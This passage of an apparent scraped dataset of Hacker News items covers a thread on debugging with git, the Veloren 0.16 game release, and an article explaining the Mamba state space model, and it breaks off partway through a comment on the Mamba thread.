make the command pass. I use this to make sure that there is no commit that leaves my project in an unbuildable state. reply eru 7 hours agoparentYou can also use `--interactive` to do a lot of complicated stuff. reply cerved 13 hours agoprevAnother thing you can do when you have two versions, one which fails and one which doesn't, but where the commits are of the messy work in progress nature and not atomic changes, is gradually stage the changes from the bad version onto the good version until it starts failing Basically git checkout -p until things fail reply lucasoshiro 12 hours agoparentThanks for the comment! It looks to be a very useful tip for doing after bisect on repositories where people insist to squash pull requests. reply billllll 11 hours agoprevDidn't know Git had a bisect feature. I'll keep that in mind for later. Other than bisect though, I do think a lot of the practices outlined in the article (checking the blame, logs, search, etc) is way easier to do in a web UI, at least for someone like me who hasn't tailored their workflow for the command line. The tooling is so ubiquitous that it's easily available. I personally think GitHub does okay in those regards. reply lucasoshiro 9 hours agoparentPersonally, I've tried some graphical tools (e.g. magit on Emacs and the git tools on JetBrains IDEs), but still prefer CLI as I think those UIs hide too much from the user, specially in more complex repositories (e.g. repos with submodules). These features (except blame) are more advanced features, that may be hidden in those interfaces. Instead of remember where they are behind some menus or shortcuts, I prefer to remember their CLI as it is faster. reply tombert 8 hours agoprevGit Bisect has saved me multiple times. It's such a simple concept, but being able to hone into the commit where something is broken is almost always useful. I've never tried automating it. That'll be fun to try next time I'm in trouble. reply interbased 7 hours agoprevI never knew about the -s flag with git log. That would be super helpful in many situations for me / my team. reply n4r9 13 hours agoprev [–] Another way to use git to debug - albeit more tedious - is to manually check out branches (using a binary search) until you find the exact change that caused an issue. This is helpful if you have no idea what part of the code is causing a problem, but you know the problem didn't exist a month ago. Performance issues are a good example. reply yjftsjthsd-h 13 hours agoparentI don't know about branches, but if you're just traversing history that's a textbook use for git bisect, right? reply n4r9 13 hours agorootparentYes, failure to rtfa on my part. reply globular-toast 13 hours agorootparentprevYep. Git bisect automatically does a binary search to find the earliest breaking commit. You can either test each version manually or, if you have a script that will pass or fail, like a unit test, you can tell git and it will do everything automatically. I love it when I get to use git bisect. reply amboar 12 hours agorootparentA handy trick I've developed is using`git bisect` to solve otherwise intractable rebase conflicts: https://codeconstruct.com.au/docs/bisect-intractable-rebase-... reply eru 7 hours agorootparentYou might want to combine this with enabling rerere. reply amboar 5 hours agorootparentYeah, I have rerere turned on However, it's not directly beneficial for the process outlined. With what I wrote about you only solve a given conflict at the end of a complete bisect run, not at each bisection point inside a run. The bisect/cherry-pick process is only used to determine whether conflicts do or don't happen at a given upstream commit. Usually you will solve a specific conflict only once, regardless of whether rerere is enabled. reply shinycode 10 hours agoparentprevIn jetbrain products, you can select any bloc of code and show the git history for this particular bloc. I don’t know exactly which command is behind it but I always thought it would be tedious to do it manually like you described reply lucasoshiro 9 hours agorootparentProbably they use libgit2 instead of git. But you can use git log -L for that. reply nonethewiser 11 hours agoparentprev [–] Thats called git bisect reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The article explores utilizing Git as a debugging tool, emphasizing Git basics such as commits, branches, and the staging area.",
      "It demonstrates employing pathspecs in Git for file selection based on particular criteria and leveraging git grep for code searches.",
      "Moreover, it introduces using Git log to analyze commit history and Git Bisect for bug identification in projects, while also welcoming feedback and suggestions via GitHub."
    ],
    "commentSummary": [
      "Clear commit messages in Git are crucial for efficient debugging, emphasizing the drawbacks of generic messages and how different commit strategies affect readability.",
      "Utilizing Git commands like `git commit --amend`, `git rebase`, and tools like Magit enhances efficiency and tracking changes in code repositories.",
      "Git commands such as rebase, interactive rebase, and bisect are valuable for debugging and tracking changes, with Git bisect especially useful for pinpointing the root of problems."
    ],
    "points": 159,
    "commentCount": 43,
    "retryCount": 0,
    "time": 1711825521
  },
  {
    "id": 39876804,
    "title": "Veloren 0.16: New Features & Release Event on March 30th",
    "originLink": "https://veloren.net/blog/release-0-16/",
    "originBody": "Veloren 0.16 Release 3 minute read25 March 2024 0.16 Release Veloren is finally releasing 0.16! It has been 9 months since 0.15 was released so there has been a lot of work put into this version. If you're reading this before 18:00 GMT on March 30th, make sure to join the release party. On the side, you can also watch the release party dev stream, where we'll be chatting with devs about what went into this version. To join, you can download the game for free at veloren.net and create an account, then launch the game and hop on the default server. See you there! We'll also be having a vote on Discord for the new map to use for the official server in the coming days. Be sure to check that out! New in this release Here are some of the changes in this release: New axe skill tree. Two new dungeons, haniwa catacombs and terracotta ruins. Some new structures: airship docs, taverns and desert arenas. We got a cool new mesa biome, where the mountain towns are built now. Caves got a really cool update, with new cave biomes, be sure to check them out! We are finally using a new wgpu version which allows people to run the game using OpenGL. Plugins have gotten updates and it's now supported for servers to have plugins which are shared with the client when joining. Map generation UI for singleplayer in voxygen. Many balancing changes. New models and shader changes so the low level of detail terrain will look a lot better. While gliding you can now encounter updrafts. Changelog As always, there are always more changes than we can add to a single post! You can check out the full changelog here. Thanks to this versions contributors (in random order): Laura, Monty Marz, Yusuf Bera Ertan, Animoe, Gemu Peachems, Talha Qamar, BigKhan, Xiretza, Keegan-JW, Marcel Märtens, Tim Vincent, Woeful_Wolf, Youssef Fahmy, Pybit, Uniior, Haijo7, TelepathicWalrus, Treeco, JimmyDdotEXE, Benoît du Garreau, Dmytro Kovalchuk, Froggy, Hugo Famechon, Neras, Illia Denysenko, HEIEnthusiast, Joshua Barretto, Javier Pérez, Sorann753, JCoxeye, David Fisher, danielkenji83, Syniis, crabman, Igigog, Jaroslav Lichtblau, Francesco Vasco, Darren Salt, Otto Richter, Py bit, Thomas S, flo666, Justin Shipsey, Dominik Broński, Marcel, Avi Weinstock, Ben Wallis, Raul Wagner Costa, Stefan Glorch, Nadja von Reitzenstein Čerpnjak, Isse, Gaxrodi, walpo, Sam, Joaquin Tornello, Christof Petig, PopeRigby, nectical, RunRobDog, jshipsey, juliancoffee, Hrom, tygyh, Samuel Keiffer, Youser Nayme, Michal Sroczynski, Evgen Kot, UncomfySilence, 心慌慌脸红红, Brandon Dyer, uniior, James Hiew, laundmo, Sanctorum Thomas, do-no-van, Imbris, evgenkot, Scott Bronson, flo, João Capucho, DaforLynx, Jeffrey Cox, James Melkonian, Michał Since the last release we have started using Weblate for translation contributions. Those contributors are listed here (in random order): tidare, Vuizur, juliancoffee, AldanTanneo, guillermytho, Paw, marcelodemonn, Nylux, Vybearz, 5Litt, DiXiao, ezamux, Jasmia, Timm, thomas-babord, zoli111, leca, Renkal, macintosh, zerocraft, GeroinEX, RyanOrigins, Vallley, mapemka, tdehtyar, alextecplayz, Nifou, Axegaik, jadedctrl, loglizzy, Sinari, Dutchy5, aleeo, DominicF96, FruityHarriott, evgenkot, Witch, alexjhr, valebest26, fvasco, karinator, walpo, bov, jiangyi, Sovenok-Hacker, thatevilman, fnetX, SomeTr, Ixniyevonn, mozz, Positron832, dyegomb Support the project As always, feel free to support the project on Open Collective. It allows us to keep our servers running, and launch great release parties like the one for this release!",
    "commentLink": "https://news.ycombinator.com/item?id=39876804",
    "commentBody": "Veloren, an open source game, release 0.16 (veloren.net)159 points by AngelOnFira 16 hours agohidepastfavorite13 comments hasbot 11 hours agoPet peeve: out of context release announcements. From the README.md: Veloren is a multiplayer voxel RPG written in Rust. It is inspired by games such as Cube World, The Legend of Zelda: Breath of the Wild, Dwarf Fortress and Minecraft. The game is in active development and enjoys a flourishing player community. reply Lacerda69 3 hours agoparentThanks I had no idea what it was about reading the website - just a massive chancelog. They really gotta add an intro or something for new players. reply block_dagger 11 hours agoprevNever heard of this, but just downloaded it. After trying Vintage Story, this feels incredibly polished! Ability to zoom out from character perspective to entire world without a hitch kind of blows my mind. And written in Rust! I may be a new fan. reply OgsyedIE 10 hours agoparentIn other games it's called Strategic Zoom and it's an impressive feature whenever it crops up. reply rbosinger 10 hours agoparentprevDoes Vintage Story not feel very polished? I was just about to find some time to try it. reply block_dagger 7 hours agorootparentIt still feels very early stage to me, perhaps \"polished\" is the wrong term to use. It's also extremely difficult for a casual player like myself, focusing heavily on basic survival mechanics. reply idle_zealot 10 hours agorootparentprevVintage Story is quite polished in my experience. It's a bit disappointing content-wise though. The tech progression doesn't go very far, and what's there is nearly identical to the TerraFirmaCraft Minecraft mod. reply quickslowdown 14 hours agoprevNever heard of this, but it looks great! I'm going to spin up a server tonight, see what my friends who've played Minecraft with me think :) reply wexomania 11 hours agoprevOh! Is this a bit like Cube World? I loved that game before the developer dropped of the face of the planet, then came back and changed everything... reply TaylorAlexander 11 hours agoparentI’ve heard this yes, maybe a mix of cube world and another game. I never played either but Veloren is fun even when all you could do was run and paraglide around the world and explore, but they’ve long since added many story elements too. reply steanne 9 hours agoparentprevthat's what spurred the creation of veloren. reply ashton314 6 hours agoprevI’ve been playing Veloren for several months now and I love it. (My nick is “varsderk”—say hi if you see me!) It’s been going through a ton of development progress; the game now is very different from the game I started with; it keeps getting better. So happy this thing exists! reply echelon 13 hours agoprev [–] I was looking the other day to see if this used the Bevy game engine, but it looks like Veloren started just before Bevy and wasn't able to take advantage of it. This is a pretty massive achievement for the Veloren team to do all of this themselves. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Veloren 0.16 introduces a new axe skill tree, dungeons, structures, biomes, and improvements to caves and terrain.",
      "A release party and developer stream are scheduled for March 30th, with a Discord poll for a new map.",
      "The changelog acknowledges all contributors, including translators who used Weblate, with project support accessible via Open Collective."
    ],
    "commentSummary": [
      "Veloren is a multiplayer voxel RPG written in Rust, inspired by Cube World and Minecraft, with an active development community.",
      "The recent release of version 0.16 is well-received by players for its polished gameplay, zoom-out feature, and continuous enhancements.",
      "It's considered a unique and thrilling addition to the genre, standing out even among games like Vintage Story."
    ],
    "points": 159,
    "commentCount": 13,
    "retryCount": 0,
    "time": 1711819890
  },
  {
    "id": 39876114,
    "title": "Mamba: A State Space Model Revolutionizing Sequence Modeling",
    "originLink": "https://thegradient.pub/mamba-explained/",
    "originBody": "The State Space Model taking on Transformers Right now, AI is eating the world. And by AI, I mean Transformers. Practically all the big breakthroughs in AI over the last few years are due to Transformers. Mamba, however, is one of an alternative class of models called State Space Models (SSMs). Importantly, for the first time, Mamba promises similar performance (and crucially similar scaling laws) as the Transformer whilst being feasible at long sequence lengths (say 1 million tokens). To achieve this long context, the Mamba authors remove the “quadratic bottleneck” in the Attention Mechanism. Mamba also runs fast - like “up to 5x faster than Transformer fast”1. Mamba performs similarly (or slightly better than) other Language Models on The Pile (source) Gu and Dao, the Mamba authors write: Mamba enjoys fast inference and linear scaling in sequence length, and its performance improves on real data up to million-length sequences. As a general sequence model backbone, Mamba achieves state-of-the-art performance across several modalities such as language, audio, and genomics. On language modelling, our Mamba-3B model outperforms Transformers of the same size and matches Transformers twice its size, both in pretraining and downstream evaluation. Here we’ll discuss: The advantages (and disadvantages) of Mamba (🐍) vs Transformers (🤖), Analogies and intuitions for thinking about Mamba, and What Mamba means for Interpretability, AI Safety and Applications. Problems with Transformers - Maybe Attention Isn’t All You Need We’re very much in the Transformer-era of history. ML used to be about detecting cats and dogs. Now, with Transformers, we’re generating human-like poetry, coding better than the median competitive programmer, and solving the protein folding problem. But Transformers have one core problem. In a transformer, every token can look back at every previous token when making predictions. For this lookback, we cache detailed information about each token in the so-called KV cache. When using the Attention Mechanism, information from all previous tokens can be passed to the current token This pairwise communication means a forward pass is O(n²) time complexity in training (the dreaded quadratic bottleneck), and each new token generated autoregressively takes O(n) time. In other words, as the context size increases, the model gets slower. To add insult to injury, storing this key-value (KV) cache requires O(n) space. Consequently, the dreaded CUDA out-of-memory (OOM) error becomes a significant threat as the memory footprint expands. If space were the only concern, we might consider adding more GPUs; however, with latency increasing quadratically, simply adding more compute might not be a viable solution. On the margin, we can mitigate the quadratic bottleneck with techniques like Sliding Window Attention or clever CUDA optimisations like FlashAttention. But ultimately, for super long context windows (like a chatbot which remembers every conversation you’ve shared), we need a different approach. Foundation Model Backbones Fundamentally, all good ML architecture backbones have components for two important operations: Communication between tokens Computation within a token The Transformer Block In transformers, this is Attention (communication) and MLPs (computation). We improve transformers by optimising these two operations2. We would like to substitute the Attention component3 with an alternative mechanism for facilitating inter-token communication. Specifically, Mamba employs a Control Theory-inspired State Space Model, or SSM, for Communication purposes while retaining Multilayer Perceptron (MLP)-style projections for Computation. The Mamba Block Like a Transformer made up of stacked transformer blocks, Mamba is made up of stacked Mamba blocks as above. We would like to understand and motivate the choice of the SSM for sequence transformations. Motivating Mamba - A Throwback to Temple Run Imagine we’re building a Temple Run agent4. It chooses if the runner should move left or right at any time. To successfully pick the correct direction, we need information about our surroundings. Let’s call the collection of relevant information the state. Here the state likely includes your current position and velocity, the position of the nearest obstacle, weather conditions, etc. Claim 1: if you know the current state of the world and how the world is evolving, then you can use this to determine the direction to move. Note that you don’t need to look at the whole screen all the time. You can figure out what will happen to most of the screen by noting that as you run, the obstacles move down the screen. You only need to look at the top of the screen to understand the new information and then simulate the rest. This lends itself to a natural formulation. Let h be the hidden state, relevant knowledge about the world. Also let x be the input, the observation that you get each time. h’ then represents the derivative of the hidden state, i.e. how the state is evolving. We’re trying to predict y, the optimal next move (right or left). Now, Claim 1 states that from the hidden state h, h’, and the new observation x, you can figure out y. More concretely, h, the state, can be represented as a differential equation (Eq 1a): h′(t)=Ah(t)+Bx(t) Knowing h allows you to determine your next move y (Eq 1b): y(t)=Ch(t)+Dx(t) The system's evolution is determined by its current state and newly acquired observations. A small new observation is enough, as the majority of the state can be inferred by applying known state dynamics to its previous state. That is, most of the screen isn’t new, it’s just a continuation of the previous state's natural downward trajectory. A full understanding of the state would enable optimal selection of the subsequent action, denoted as y. You can learn a lot about the system dynamics by observing the top of the screen. For instance, increased velocity of this upper section suggests an acceleration of the rest of the screen as well, so we can infer that the game is speeding up5. In this way, even if we start off knowing nothing about the game and only have limited observations, it becomes possible to gain a holistic understanding of the screen dynamics fairly rapidly. What’s the State? Here, state refers to the variables that, when combined with the input variables, fully determine the future system behaviour. In theory, once we have the state, there’s nothing else we need to know about the past to predict the future. With this choice of state, the system is converted to a Markov Decision Process. Ideally, the state is a fairly small amount of information which captures the essential properties of the system. That is, the state is a compression of the past6. Discretisation - How To Deal With Living in a Quantised World Okay, great! So, given some state and input observation, we have an autoregressive-style system to determine the next action. Amazing! In practice though, there’s a little snag here. We’re modelling time as continuous. But in real life, we get new inputs and take new actions at discrete time steps7. We would like to convert this continuous-time differential equation into a discrete-time difference equation. This conversion process is known as discretisation. Discretisation is a well-studied problem in the literature. Mamba uses the Zero-Order Hold (ZOH) discretisation8. To give an idea of what’s happening morally, consider a naive first-order approximation9. From Equation 1a, we have h′(t)=Ah(t)+Bx(t) And for small ∆, h′(t)≈ h(t+Δ)−h(t) Δ by the definition of the derivative. We let: ht=h(t) and ht+1=h(t+Δ) and substitute into Equation 1a giving: ht+1−ht≈Δ(Aht+Bxt) ⇒ht+1≈(I+ΔA)ht+(ΔB)xt Hence, after renaming the coefficients and relabelling indices, we have the discrete representations: The Discretised Version of the SSM Equation If you’ve ever looked at an RNN before10 and this feels familiar - trust your instincts: We have some input x, which is combined with the previous hidden state by some transform to give the new hidden state. Then we use the hidden state to calculate the output at each time step. Understanding the SSM Matrices Now, we can interpret the A, B, C, D matrices more intuitively: A is the transition state matrix. It shows how you transition the current state into the next state. It asks “How should I forget the less relevant parts of the state over time?” B is mapping the new input into the state, asking “What part of my new input should I remember?”11 C is mapping the state to the output of the SSM. It asks, “How can I use the state to make a good next prediction?”12 D is how the new input passes through to the output. It’s a kind of modified skip connection that asks “How can I use the new input in my prediction?” Visual Representation of The SSM Equations Additionally, ∆ has a nice interpretation - it’s the step size, or what we might call the linger time or the dwell time. For large ∆, you focus more on that token; for small ∆, you skip past the token immediately and don’t include it much in the next state. (source) And that’s it! That’s the SSM, our ~drop-in replacement for Attention (Communication) in the Mamba block. The Computation in the Mamba architecture comes from regular linear projections, non-linearities, and local convolutions. Okay great, that’s the theory - but does this work? Well… Effectiveness vs Efficiency: Attention is Focus, Selectivity is Prioritisation At WWDC ‘97, Steve Jobs famously noted that “focusing is about saying no”. Focus is ruthless prioritisation. It’s common to think about Attention positively as choosing what to notice. In the Steve Jobs sense, we might instead frame Attention negatively as choosing what to discard. There’s a classic intuition pump in Machine Learning known as the Cocktail Party Problem13. Imagine a party with dozens of simultaneous loud conversations: Question: How do we recognise what one person is saying when others are talking at the same time?14 Answer: The brain solves this problem by focusing your “attention” on a particular stimulus and hence drowning out all other sounds as much as possible. Transformers use Dot-Product Attention to focus on the most relevant tokens. A big reason Attention is so great is that you have the potential to look back at everything that ever happened in its context. This is like photographic memory when done right.15 Transformers (🤖) are extremely effective. But they aren’t very efficient. They store everything from the past so that they can look back at tokens with theoretically perfect recall. Traditional RNNs (🔁) are the opposite - they forget a lot, only recalling a small amount in their hidden state and discarding the rest. They are very efficient - their state is small. Yet they are less effective as discarded information cannot be recovered. We’d like something closer to the Pareto frontier of the effectiveness/efficiency tradeoff. Something that’s more effective than traditional RNNs and more efficient than transformers. The Mamba Architecture seems to offer a solution which pushes out the Pareto frontier of effectiveness/efficiency. SSMs are as efficient as RNNs, but we might wonder how effective they are. After all, it seems like they would have a hard time discarding only unnecessary information and keeping everything relevant. If each token is being processed the same way, applying the same A and B matrices as if in a factory assembly line for tokens, there is no context-dependence. We would like the forgetting and remembering matrices (A and B respectively) to vary and dynamically adapt to inputs. The Selection Mechanism Selectivity allows each token to be transformed into the state in a way that is unique to its own needs. Selectivity is what takes us from vanilla SSM models (applying the same A (forgetting) and B (remembering) matrices to every input) to Mamba, the Selective State Space Model. In regular SSMs, A, B, C and D are learned matrices - that is A=Aθ etc. (where θ represents the learned parameters) With the Selection Mechanism in Mamba, A, B, C and D are also functions of x. That is A=Aθ(x) etc; the matrices are context dependent rather than static. Mamba (right) differs from traditional SSMs by allowing A,B,C matrices to be selective i.e. context dependent (source) Making A and B functions of x allows us to get the best of both worlds: We’re selective about what we include in the state, which improves effectiveness vs traditional SSMs. Yet, since the state size is bounded, we improve on efficiency relative to the Transformer. We have O(1), not O(n) space and O(n) not O(n²) time requirements. The Mamba paper authors write: The efficiency vs. effectiveness tradeoff of sequence models is characterized by how well they compress their state: efficient models must have a small state, while effective models must have a state that contains all necessary information from the context. In turn, we propose that a fundamental principle for building sequence models is selectivity: or the context-aware ability to focus on or filter out inputs into a sequential state. In particular, a selection mechanism controls how information propagates or interacts along the sequence dimension. Humans (mostly) don’t have photographic memory for everything they experience within a lifetime - or even within a day! There’s just way too much information to retain it all. Subconsciously, we select what to remember by choosing to forget, throwing away most information as we encounter it. Transformers (🤖) decide what to focus on at recall time. Humans (🧑) also decide what to throw away at memory-making time. Humans filter out information early and often. If we had infinite capacity for memorisation, it’s clear the transformer approach is better than the human approach - it truly is more effective. But it’s less efficient - transformers have to store so much information about the past that might not be relevant. Transformers (🤖) only decide what’s relevant at recall time. The innovation of Mamba (🐍) is allowing the model better ways of forgetting earlier - it’s focusing by choosing what to discard using Selectivity, throwing away less relevant information at memory-making time16. The Problems of Selectivity Applying the Selection Mechanism does have its gotchas though. Non-selective SSMs (i.e. A,B not dependent on x) are fast to compute in training. This is because the component of Yt which depends on xi can be expressed as a linear map, i.e. a single matrix that can be precomputed! For example (ignoring the D component, the skip connection): y2=CBx2+CABx1+CAABx0 If we’re paying attention, we might spot something even better here - this expression can be written as a convolution. Hence we can apply the Fast Fourier Transform and the Convolution Theorem to compute this very efficiently on hardware as in Equation 3 below. We can calculate Equation 2, the SSM equations, efficiently in the Convolutional Form, Equation 3. Unfortunately, with the Selection Mechanism, we lose the convolutional form. Much attention is given to making Mamba efficient on modern GPU hardware using similar hardware optimisation tricks to Tri Dao’s Flash Attention17. With the hardware optimisations, Mamba is able to run faster than comparably sized Transformers. Machine Learning for Political Economists - How Large Should The State Be? The Mamba authors write, “the efficiency vs. effectiveness tradeoff of sequence models is characterised by how well they compress their state”. In other words, like in political economy18, the fundamental problem is how to manage the state. 🔁 Traditional RNNs are anarchic They have a small, minimal state. The size of the state is bounded. The compression of state is poor. 🤖 Transformers are communist They have a maximally large state. The “state” is just a cache of the entire history with no compression. Every context token is treated equally until recall time. 🐍Mamba has a compressed state …but it’s selective about what goes in. Mamba says we can get away with a small state if the state is well focused and effective19. Language Models and State Size The upshot is that state representation is critical. A smaller state is more efficient; a larger state is more effective. The key is to selectively and dynamically compress data into the state. Mamba’s Selection Mechanism allows for context-dependent reasoning, focusing and ignoring. For both performance and interpretability, understanding the state seems to be very useful. Information Flow in Transformer vs Mamba How do Transformers know anything? At initialization, a transformer isn’t very smart. It learns in two ways: Training data (Pretraining, SFT, RLHF etc) In context-data Training Data Models learn from their training data. This is a kind of lossy compression of input data into the weights. We can think of the effect of pretraining data on the transformer kinda like the effect of your ancestor’s experiences on your genetics - you can’t recall their experiences, you just have vague instincts about them20. In Context-Data Transformers use their context as short-term memory, which they can recall with ~perfect fidelity. So we get In-Context Learning, e.g. using induction heads to solve the Indirect Object Identification task, or computing Linear Regression. Retrieval Note that Transformers don’t filter their context at all until recall time. So if we have a bunch of information we think might be useful to the Transformer, we filter it outside the Transformer (using Information Retrieval strategies) and then stuff the results into the prompt. This process is known as Retrieval Augmented Generation (RAG). RAG determines relevant information for the context window of a transformer. A human with the internet is kinda like a RAG system - you still have to know what to search but whatever you retrieve is as salient as short-term memory to you. Information Flow for Mamba Training Data acts similarly for Mamba. However, the lines are slightly blurred for in-context data and retrieval. In-context data for Mamba is compressed/filtered similar to retrieval data for transformers. This in-context data is also accessible for look-up like for transformers (although with somewhat lower fidelity). Transformer context is to Mamba states what short-term is to long-term memory. Mamba doesn’t just have “RAM”, it has a hard drive21 22. Swapping States as a New Prompting Paradigm Currently, we often use RAG to give a transformer contextual information. With Mamba-like models, you could instead imagine having a library of states created by running the model over specialised data. States could be shared kinda like LoRAs for image models. For example, I could do inference on 20 physics textbooks and, say, 100 physics questions and answers. Then I have a state which I can give to you. Now you don’t need to add any few-shot examples; you just simply ask your question. The in-context learning is in the state. In other words, you can drag and drop downloaded states into your model, like literal plug-in cartridges. And note that “training” a state doesn’t require any backprop. It’s more like a highly specialised one-pass fixed-size compression algorithm. This is unlimited in-context learning applied at inference time for zero-compute or latency23. The structure of an effective LLM call goes from… System Prompt Preamble Few shot-examples Question …for Transformers, to simply… Inputted state (with problem context, initial instructions, textbooks, and few-shot examples) Short question …for Mamba. This is cheaper and faster than few-shot prompting (as the state is infinitely reusable without inference cost). It’s also MUCH cheaper than finetuning and doesn’t require any gradient updates. We could imagine retrieving states in addition to context. Mamba & Mechanistic Interpretability Transformer interpretability typically involves: understanding token relationships via attention, understanding circuits, and using Dictionary Learning for unfolding MLPs. Most of the ablations that we would like to do for Mamba are still valid, but understanding token communication (1) is now more nuanced. All information moves between tokens via hidden states instead of the Attention Mechanism which can “teleport” information from one sequence position to another. For understanding in-context learning (ICL) tasks with Mamba, we will look to intervene on the SSM state. A classic task in-context learning task is Indirect Object Identification in which a model has to finish a paragraph like: Then, Shelby and Emma had a lot of fun at the school. [Shelby/Emma] gave an apple to [BLANK] The model is expected to fill in the blank with the name that is not repeated in the paragraph. In the chart below we can see that information is passed from the [Shelby/Emma] position to the final position via the hidden state (see the two blue lines in the top chart). Since it’s hypothesised that much of In-Context Learning in Transformers is downstream of more primitive sequence position operations (like Induction Heads), Mamba being able to complete this task suggests a more general In-Context Learning ability. What’s Next for Mamba & SSMs? Mamba-like models are likely to excel in scenarios requiring extremely long context and long-term memory. Examples include: Processing DNA Generating (or reasoning over) video Writing novels An illustrative example is agents with long-term goals. Suppose you have an agent interacting with the world. Eventually, its experiences become too much for the context window of a transformer. The agent then has to compress or summarise its experiences into some more compact representation. But how do you decide what information is the most useful as a summary? If the task is language, LLMs are actually fairly good at summaries - okay, yeah, you’ll lose some information, but the most important stuff can be retained. However, for other disciplines, it might not be clear how to summarise. For example, what’s the best way to summarise a 2 hour movie?24. Could the model itself learn to do this naturally rather than a hacky workaround like trying to describe the aesthetics of the movie in text? This is what Mamba allows. Actual long-term memory. A real state where the model learns to keep what’s important. Prediction is compression - learning what’s useful to predict what’s coming next inevitably leads to building a useful compression of the previous tokens. The implications for Assistants are clear: Your chatbot co-evolves with you. It remembers. The film HER is looking better and better as time goes on 😳 Agents & AI Safety One reason for positive updates in existential risk from AGI is Language Models. Previously, Deep-RL agents trained via self-play looked set to be the first AGIs. Language models are inherently much safer since they aren’t trained with long-term goals25. The potential for long-term sequence reasoning here brings back the importance of agent-based AI safety. Few agent worries are relevant to Transformers with an 8k context window. Many are relevant to systems with impressive long-term memories and possible instrumental goals. The Best Collab Since Taco Bell & KFC: 🤖 x 🐍 The Mamba authors show that there’s value in combining Mamba’s long context with the Transformer’s high fidelity over short sequences. For example, if you’re making long videos, you likely can’t fit a whole movie into a Transformer’s context for attention26. You could imagine having Attention look at the most recent frames for short-term fluidity and an SSM for long-term narrative consistency27. This isn’t the end for Transformers. Their high effectiveness is exactly what’s needed for many tasks. But now Transformers aren’t the only option. Other architectures are genuinely feasible. So we’re not in the post-Transformer era. But for the first time, we’re living in the post-only-Transformers era28. And this blows the possibilities wide open for sequence modelling with extreme context lengths and native long-term memory. Two ML researchers, Sasha Rush (HuggingFace, Annotated Transformer, Cornell Professor) and Jonathan Frankle (Lottery Ticket Hypothesis, MosaicML, Harvard Professor), currently have a bet here. Currently Transformers are far and away in the lead. With 3 years left, there’s now a research direction with a fighting chance. All that remains to ask is: Is Attention All We Need? Footnotes 1. see Figure 8 in the Mamba paper. 2. And scaling up with massive compute. 3. More specifically the scaled dot-product Attention popularised by Transformers 4. For people who don’t see Temple Run as the cultural cornerstone it is 🤣 Temple Run was an iPhone game from 2011 similar to Subway Surfer 5. Here we assume the environment is sufficiently smooth. 6. One pretty important constraint for this to be efficient is that we don’t allow the individual elements of the state vector to interact with each other directly. We’ll use a combination of the state dimensions to determine the output but we don’t e.g. allow the velocity of the runner and the direction of the closest obstacle (or whatever else was in our state) to directly interact. This helps with efficient computation and we achieve this practically by constraining A to be a diagonal matrix. 7. Concretely consider the case of Language Models - each token is a discrete step 8. ZOH also has nice properties for the initialisations - we want A_bar to be close to the identity so that the state can be mostly maintained from timestep to timestep if desired. ZOH gives A_bar as an exponential so any diagonal element initialisations close to zero give values close to 1 9. This is known as the Euler discretisation in the literature 10. It’s wild to note that some readers might not have, we’re so far into the age of Attention that RNNs have been forgotten! 11. B is like the Query (Q) matrix for Transformers. 12. C is like the Output (O) matrix for Transformers. 13. Non-alcoholic options also available! 14. Especially as all voices roughly occupy the same space on the audio frequency spectrum Intuitively this seems really hard! 15. Note that photographic memory doesn’t necessarily imply perfect inferences from that memory! 16. To be clear, if you have a short sequence, then a transformer should theoretically be a better approach. If you can store the whole context, then why not!? If you have enough memory for a high-resolution image, why compress it into a JPEG? But Mamba-style architectures are likely to hugely outperform with long-range sequences. 17. More details are available for engineers interested in CUDA programming - Tri’s talk, Mamba paper section 3.3.2, and the official CUDA code are good resources for understanding the Hardware-Aware Scan 18. or in Object Oriented Programming 19. Implications to actual Political Economy are left to the reader but maybe Gu and Dao accidentally solved politics!? 20. This isn’t a perfect analogy as human evolution follows a genetic algorithm rather than SGD. 21. Albeit a pretty weird hard drive at that - it morphs over time rather than being a fixed representation. 22. As a backronym, I’ve started calling the hidden_state the state space dimension (or selective state dimension) which shortens to SSD, a nice reminder for what this object represents - the long-term memory of the system. 23. I’m thinking about this similarly to the relationship between harmlessness finetuning and activation steering. State swapping, like activation steering, is an inference time intervention giving comparable results to its train time analogue. 24. This is a very non-trivial problem! How do human brains represent a movie internally? It’s not a series of the most salient frames, nor is it a text summary of the colours, nor is it a purely vibes-based summary if you can memorise some lines of the film. 25. They’re also safer since they inherently understand (though don’t necessarily embody) human values. It’s not all clear that how to teach an RL agent human morality. 26. Note that typically an image (i.e. a single frame) counts as >196 tokens, and movies are typically 24 fps so you’ll fill a 32k context window in 7 seconds 🤯 27. Another possibility that I’m excited about is applying optimisation pressure to the state itself as well as the output to have models that respect particular use cases. 28. This is slightly hyperbolic, the TS-Mixer for time series, Gradient Boosting Trees for tabular data and Graph Neural Networks for weather prediction exist and are currently used, but these aren’t at the core of AI Author Bio Kola Ayonrinde is a Research Scientist and Machine Learning Engineer with a flair for writing. He integrates technology and creativity, focusing on applying machine learning in innovative ways and exploring the societal impacts of tech advancements. Acknowledgements This post was originally posted on Kola's personal blog. Thanks to Gonçalo for reading an early draft, Jaden for the nnsight library used for the Interpretability analysis and Tessa for Mamba patching visualisations.Also see: Mamba paper, Mamba Python code, Annotated S4, Nathan Labenz podcast Citation For attribution in academic contexts or books, please cite this work as Kola Ayonrinde, \"Mamba Explained,\" The Gradient, 2024 @article{Ayonrinde2024mamba, author = {Kola Ayonrinde}, title = {Mamba Explained}, journal = {The Gradient}, year = {2024}, howpublished = {\\url{https://thegradient.pub/mamba-explained}, } Deep Learning Reinforcement Learning Overviews",
    "commentLink": "https://news.ycombinator.com/item?id=39876114",
    "commentBody": "Mamba Explained (thegradient.pub)138 points by andreyk 17 hours agohidepastfavorite38 comments andy_xor_andrew 15 hours ago> But Transformers have one core problem. In a transformer, every token can look back at every previous token when making predictions. Lately I've been wondering... is this a problem, or a strength? It might be a fallacy to compare how LLMs \"think\" with how humans think. But humor me for a second. When you are speaking, each time you emit a word, you are not attending to every previous word in your sentence (like transformers), rather you have a state in your mind that represents the grammar and concepts, which is continuously updated as you speak (more similar to SSMs). Similarly, when you read a book, every time you read a word, you are not attending to every previous word in the book. Your model of \"the book\" is rather a fuzzy/approximate state that is updated with new information every time a new word appears. Right? (I'm sorry I know this is very handwavy and psuedoscientific but bear with me). Ok, so if (big if) you feel like the above is true, then to match human-type language modelling, SSMs seem more human-like than transformers. BUT... then aren't transformers strictly better in terms of accuracy? Because a transformer never \"forgets\" information, as long as it is within the context window, because it revisits that information every time it emits a new token. So let's say we can remove the \"quadratic attention\" problem of transformers with SSMs. That's a nice training/inference 